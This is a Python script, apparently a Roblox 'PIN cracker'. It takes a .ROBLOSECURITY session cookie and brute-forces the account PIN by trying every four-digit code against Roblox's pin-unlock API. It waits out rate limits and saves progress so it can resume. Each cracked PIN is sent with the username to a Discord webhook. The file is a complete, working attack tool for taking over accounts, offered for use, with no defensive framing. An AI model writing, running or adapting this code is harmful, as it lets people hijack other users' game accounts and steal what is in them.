import subprocess
import requests
import json
import time
import os

try:
    from termcolor import cprint
except ImportError:
    print("[", end="")
    print('\033[31m' + " ERROR ", "red", end="")
    print("] ", end="")
    print('\033[31m' + "Packages not installed. Installing now...")
    subprocess.call("pip install termcolor", shell=True)
finally:
    from termcolor import cprint

def is_cookie_valid(cookie):
    response = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": cookie})
    return response.status_code == 200

def load_progress():
    try:
        with open('progress.json', 'r') as f:
            return json.load(f).get('current_pin', 0)
    except FileNotFoundError:
        return 0

def save_progress(pin):
    with open('progress.json', 'w') as f:
        json.dump({'current_pin': pin}, f)

class Crack:
    def __init__(self):
        self.cookie = None
        self.webhook = None
        self.continueProgress = None
        self.check()  # Call check to get cookie and webhook
        self.start()

    def check(self):
        self.cookie = input("Enter your .ROBLOSECURITY cookie: ")
        while not is_cookie_valid(self.cookie):
            print("Invalid cookie. Please try again.")
            self.cookie = input("Enter your .ROBLOSECURITY cookie: ")

        self.webhook = input("Enter your Discord webhook URL: ")
        self.continueProgress = input("Do you want to continue from the last progress? (y/n): ").lower() == 'y'

    def start(self):
        self.clear()
        print('\u001B[35m█▀█ █ █▄░█ ▄▄ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█\n█▀▀ █ █░▀█ ░░ █▄▄ █▀▄ █▀█ █▄▄ █░█ ██▄ █▀▄\u001B[37m\n================================================\n\t\u001B[31mPIN CRACKER | REMODDED BY: RAISHIN\t\u001B[37m \n================================================')

        time.sleep(1)
        self.clear()

        print('''[CRACKER STARTED]''')

        url = 'https://auth.roblox.com/v1/account/pin/unlock'
        xcrsf = requests.post('https://auth.roblox.com/v1/login', cookies={".ROBLOSECURITY": self.cookie}).headers['x-csrf-token']
        header = {'X-CSRF-TOKEN': xcrsf}

        start_time = time.time()
        current_pin = load_progress()

        for current_pin in range(current_pin, 10000):
            pin = str(current_pin).zfill(4)
            payload = {'pin': pin}
            r = requests.post(url, data=payload, headers=header, cookies={".ROBLOSECURITY": self.cookie})

            if 'unlockedUntil' in r.text:
                print(f'\u001B[32m[SUCCESSFULLY CRACKED] PIN:\u001B[37m  \u001B[34m {pin} \u001B[37m')
                username = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": self.cookie}).json()['name']
                data = {
                    "content": '@everyone' if self.continueProgress else 'Pin Successfully Cracked!',
                    "username": "Rai$hin - Pin Cracker",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1234384385310986241/1302569512192839680/Kokichi_Muta.png?ex=6729e964&is=672897e4&hm=decf67d5cf366b2098e60d6066533e24f54b5eb4cdc6bbe572460f04ac2e6a46&",
                    "embeds": [{
                        "description": f"{username}'s Pin:\n```{pin}```",
                        "title": "Cracked Pin!",
                        "color": 0x00ff00,
                    }]
                }
                requests.post(self.webhook, json=data)
                print("Webhook sent successfully.")
                break

            elif 'Too many requests made' in r.text:
                print("\u001B[31m[ERROR] Too many requests made. Please wait before trying again.\u001B[37m")
                time.sleep(5)  # Wait before retrying
                continue

            # Save progress after each attempt
            save_progress(current_pin)

        print("\u001B[33m[CRACKING COMPLETED] All pins checked up to 9999.\u001B[37m")

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    Crack()
